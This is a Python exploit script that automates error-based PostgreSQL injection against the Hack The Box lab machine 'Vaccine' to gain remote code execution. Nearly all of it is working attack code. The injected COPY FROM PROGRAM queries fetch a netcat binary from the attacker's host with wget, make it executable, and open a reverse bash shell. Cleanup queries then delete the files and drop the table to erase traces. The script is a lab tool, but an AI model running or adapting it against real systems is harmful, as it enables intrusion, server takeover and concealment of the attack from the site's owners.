#!/usr/bin/python3

# ORIGINAL SOURCES
# https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection
# https://www.aldeid.com/wiki/HackTheBox-StartingPoint-Vaccine
# Modifier: lkim94

# DESCRIPTION
# A Python program that automates the process of error-based PostgreSQL injection RCE on the MegaCorp Car Catalogue-
# Website running on of one of the Hack The Box's machine 'Vaccine'. http://10.10.10.46/dashboard.php
#
# It provides reverse shell connection to the attacker by mainly doing the followings:
# 1. Copies the origial Netcat file (/usr/bin/nc) to the local /tmp directory of the attacker's machine.
# 2. Sets up an HTTP server on the local /tmp directory.
# 3. Creates a new table in the database of the target server.
# 4. Injects a query that initiates a file transfer command to download a Netcat binary file from attacker's machine.
# 5. Injects a query that executes the downloaded Netcat to initiate reverse shell.
#
# This is to be used for educational and security testing purposes only and I'm not responsible for the misuse of this program.

# CAUTION
# The shell disconnects when there's a few minutes of inactivity.
# Terminating this program's process while the shell is active can also cause unexpected disconnection, and improper houseclean.

# USAGE
# nc -lvnp <listen_port#>
# python3 PostgreSQL-Shell.py -L <attacker_ip> -l <listen_port#> -t <target_ip> -p <url_parameter> -c <cookie>

# EXAMPLE
# python3 PostgreSQL-Shell.py -L 10.10.14.44 -l 4444 -t 10.10.10.46 -p dashboard.php?search=car -c PHPSESSID=akebd2jzejfk47n3n3xucj4vem


import argparse, requests, random, os, sys, http.server, socketserver, time
from multiprocessing import Process

# Function for handling command arguments.
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-L", "--lhost", dest="lhost", help="Specifies the IP address of the attacker.")
    parser.add_argument("-l", "--lport", dest="lport", help="Specifies the port number to accept reverse shell connection.")
    parser.add_argument("-t", "--target", dest="target", help="Specifies the IP address of the target.")
    parser.add_argument("-p", "--parameter", dest="parameter", help="Specifies the URL parameter. Ex) -p dashboard.php?search=car ")
    parser.add_argument("-c", "--cookie", dest="cookie", help="Specifies the session cookie. Ex) -c PHPSESSID=akebd2jzejfk47n3n3xucj4vem")
    values = parser.parse_args()
    return values.lhost, values.lport, values.target, values.parameter, values.cookie

# Function for copying a Netcat binary file to the local /tmp directory and transferring it to the target server.
def transfer_nc():
    port = 8080

    print(f"\t[+] Copying Netcat binary to the local /tmp directory...")
    os.system('cp /usr/bin/nc /tmp')

    print(f"\t[+] Temporarily hosting HTTP server on port {port} on /tmp directory...")
    Handler = http.server.SimpleHTTPRequestHandler
    httpd = socketserver.TCPServer(('', port), Handler)
    os.chdir('/tmp')
    httpd.handle_request()

    print("\t[+] Netcat binary file transferred and HTTP server closed.")
    os.system('rm /tmp/nc')
    print(f"\t[+] Removed /tmp/nc.")

# Function for deleting attack trace.
def send_houseclean_queries(cookie, url, suffix):
    try:
        table_dropq = f"{url}';DROP TABLE IF EXISTS cmd_{suffix}; -- -"
        housecleanq = f"{url}';COPY cmd_{suffix} FROM PROGRAM 'rm -r /tmp/{suffix}'; -- -"
        request = requests.Session()

        print(f"\n[+] Deleting /tmp/{suffix} directory...\n[+] Query => {housecleanq}")
        request.get(housecleanq, cookies=cookie)

        print(f"\n[+] Sending a table drop query...\n[+] Query => {table_dropq}")
        request.get(table_dropq, cookies=cookie)

        print("\n[+] Exiting.")

    except KeyboardInterrupt:
        print("\n[!] Exiting.")

try:
    user_input = get_arguments()
    lhost = user_input[0]
    lport = user_input[1]
    target = user_input[2]
    param = user_input[3]
    cookie = user_input[4].split("=")
    cookie = {cookie[0]:cookie[1]}
    url = f"http://{target}/{param}"
    suffix = "casey"

    table_dropq = f"{url}';DROP TABLE IF EXISTS cmd_{suffix}; -- -"
    table_creationq = f"{url}';CREATE TABLE cmd_{suffix}(cmd_output text); -- -"
    netcat_downloadq = f"{url}';COPY cmd_{suffix} FROM PROGRAM 'wget -P /tmp/{suffix} http://{lhost}:8080/nc'; -- -"
    netcat_chmodq = f"{url}';COPY cmd_{suffix} FROM PROGRAM 'chmod 777 /tmp/{suffix}/nc'; -- -"
    revshellq = f"{url}';COPY cmd_{suffix} FROM PROGRAM '/tmp/{suffix}/nc -e /bin/bash {lhost} {lport}'; -- -"

    request = requests.Session()
    nc_transfer_process = Process(target=transfer_nc)

    print(f"\n[+] Sending a table drop query...\n[+] Query => {table_dropq}")
    request.get(table_dropq, cookies=cookie)

    print(f"\n[+] Sending a table creation query...\n[+] Query => {table_creationq}")
    request.get(table_creationq, cookies=cookie)

    print(f"\n[+] Starting HTTP server...")
    nc_transfer_process.start(); time.sleep(3)

    print(f"\n[+] Sending a Netcat download query...\n[+] Query => {netcat_downloadq}")
    request.get(netcat_downloadq, cookies=cookie)
    nc_transfer_process.join()

    print(f"\n[+] Sending a chmod query for Netcat...\n[+] Query => {netcat_chmodq}")
    request.get(netcat_chmodq, cookies=cookie)

    print(f"\n[+] Sending a reverse shell execution query...\n[+] Query => {revshellq}")
    print(f"[+] Press 'Ctrl + C' on the shell (not here) to disconnect and perform houseclean.")
    request.get(revshellq, cookies=cookie)

    send_houseclean_queries(cookie, url, suffix)

except KeyboardInterrupt:
    send_houseclean_queries(cookie, url, suffix)
    sys.exit()

except ConnectionResetError:
    print("\n[!] ERROR: Connection lost.")
    send_houseclean_queries(cookie, url, suffix)
    sys.exit()

except http.client.RemoteDisconnected:
    send_houseclean_queries(cookie, url, suffix)
    sys.exit()

except requests.exceptions.ConnectionError:
    send_houseclean_queries(cookie, url, suffix)
    sys.exit()
